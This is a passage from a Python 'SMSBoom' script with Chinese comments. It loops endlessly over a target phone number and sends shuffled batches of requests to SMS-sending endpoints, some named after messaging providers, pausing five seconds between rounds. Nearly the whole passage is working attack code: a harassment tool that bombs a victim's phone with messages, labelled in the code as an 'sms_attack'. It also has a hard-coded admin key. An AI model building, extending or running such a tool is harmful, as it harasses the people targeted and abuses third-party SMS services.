request_url121,request_url122,request_url123,request_url124,request_url125,request_url126,request_url127,request_url128,request_url129,request_url130,
request_url131,request_url132,request_url133,request_url134,request_url135,短信1,短信2,短信3,短信4,短信5,短信6,短信7,短信8,短信9,短信10,短信11,短信12,短信13,短信14,短信15,短信16
    ]
    
    # 无限循环执行
    cycle_count = 1
    try:
        while True:
            clear_screen()
            SMS_logo()
            
            # 打印当前状态
            SMS(f"{Fore.CYAN}{'='*40}")
            SMS(f"{Fore.MAGENTA}当前目标: 手机号/ {Fore.YELLOW}循环次数: {cycle_count}")
            SMS(f"{Fore.CYAN}{'='*40}{Style.RESET_ALL}")
            
            start_time = time.time()
            
            # 创建本轮请求列表
            tasks = []
            tasks.extend([send_request4] * 10)  # 凤凰智信
            tasks.extend([send_request5] * 10)  # 智林信达
            tasks.extend(base_tasks)
            
            # 打乱请求顺序
            random.shuffle(tasks)
            
            # 执行本轮所有请求
            total_tasks = len(tasks)
            success = 0
            failed = 0
            progress_width = 20
            
            for i, func in enumerate(tasks, 1):
                # 更新进度条
                progress = int(i / total_tasks * progress_width)
                progress_bar = f"{Fore.GREEN}{'█' * progress}{Fore.RED}{'░' * (progress_width - progress)}{Style.RESET_ALL}"
                percent = int(i / total_tasks * 100)
                
                # 执行请求
                try:
                    result = func(phone)
                    if result:
                        success += 1
                    else:
                        failed += 1
                except:
                    failed += 1
                
                # 显示进度
                sys.stdout.write(f"\r{Fore.CYAN}[{progress_bar}] {percent}% | 任务: {i}/{total_tasks}")
                sys.stdout.flush()
                time.sleep(0.01)
            
            # 完成本轮
            SMS()
            elapsed = time.time() - start_time
            SMS(f"\n{Fore.CYAN}本轮完成 ")
            SMS(f"{Fore.CYAN}本轮耗时: {Fore.YELLOW}{elapsed:.2f}秒")
            SMS(f"{Fore.CYAN}即将开始下一轮循环...{Style.RESET_ALL}")
            
            # 等待倒计时
            for i in range(5, 0, -1):
                sys.stdout.write(f"\r{Fore.YELLOW}等待倒计时: {i}秒{Style.RESET_ALL} ")
                sys.stdout.flush()
                time.sleep(1)
            sys.stdout.write("\r")
            sys.stdout.flush()
            
            cycle_count += 1
            
    except KeyboardInterrupt:
        SMS(f"\n\n{Fore.RED}操作已终止{Style.RESET_ALL}")


def main():
    """主程序入口（唯一QW函数）"""
    # 显示启动横幅
    SMS(Fore.BLUE + "====================================")
    SMS(Fore.BLUE + "|          反HOOK系统 v1.0      |")
    SMS(Fore.BLUE + "|             SMSBoom            |")
    SMS(Fore.BLUE + "====================================\n")
    
    sms_attack_main()

if __name__ == "__main__":
    # QW
    if "--admin" in sys.argv:
        auth_key = input(Fore.RED + "请输入管理员授权密钥: ")
        if auth_key != "openbase64":
            SMS(Fore.RED + "无效的管理员密钥")
            sys.exit(1)
    
    main()
